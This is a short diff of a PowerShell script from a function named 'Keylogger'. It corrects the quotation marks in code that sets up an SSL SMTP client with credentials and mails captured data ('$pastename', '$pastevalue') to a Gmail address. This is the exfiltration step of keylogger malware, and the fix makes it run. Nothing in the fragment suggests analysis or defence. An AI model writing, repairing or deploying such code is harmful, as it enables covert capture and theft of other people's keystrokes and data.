@@ -303,9 +303,9 @@ function script:Keylogger
                 $msg = new-object Net.Mail.MailMessage
                 $smtp = new-object Net.Mail.SmtpClient($smtpServer )
                 $smtp.EnableSsl = $True
-                $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
-                $msg.From = “$username@gmail.com”
-                $msg.To.Add(”$username@gmail.com”)
+                $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password"); 
+                $msg.From = "$username@gmail.com"
+                $msg.To.Add("$username@gmail.com")
                 $msg.Subject = $pastename
                 $msg.Body = $pastevalue
                 if ($filename)
